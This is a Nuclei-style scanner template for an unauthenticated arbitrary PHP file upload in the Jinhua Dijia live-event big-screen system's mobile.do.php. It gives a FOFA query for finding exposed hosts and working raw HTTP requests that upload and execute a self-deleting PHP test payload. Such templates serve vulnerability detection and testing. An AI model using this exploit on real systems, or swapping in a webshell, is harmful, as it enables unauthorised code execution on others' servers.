id: jinhuadijia-mobile_do_php-File-upload

info:
  name: 金华迪加 现场大屏互动系统 mobile.do.php 任意文件上传
  author: HuanXiong
  severity: high
  description: |-
    fofa: body="/wall/themes/meepo/assets/images/defaultbg.jpg" || title="现场活动大屏幕系统"
    金华迪加 现场大屏互动系统 mobile.do.php 存在任意文件上传漏洞，未经身份验证远程攻击者可利用该漏洞代码执行，写入WebShell,进一步控制服务器权限。
  reference:
    - 
  tags: File upload
  

http:
  - raw:
      - |
        POST /mobile/mobile.do.php?action=msg_uploadimg HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
        Content-Type: application/x-www-form-urlencoded

        filetype=php&imgbase64=PD9waHAgcHJpbnQoMTExKjIyMik7dW5saW5rKF9fRklMRV9fKTs/Pg==

      - |
        GET /{{picurl}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0

    extractors:
      - type: json
        part: body
        name: picurl
        json:
          - '.message.picurl'
        internal: true

    matchers:
      - type: dsl
        name: 任意文件上传
        dsl:
          - "status_code == 200 && contains (body,'24642')"
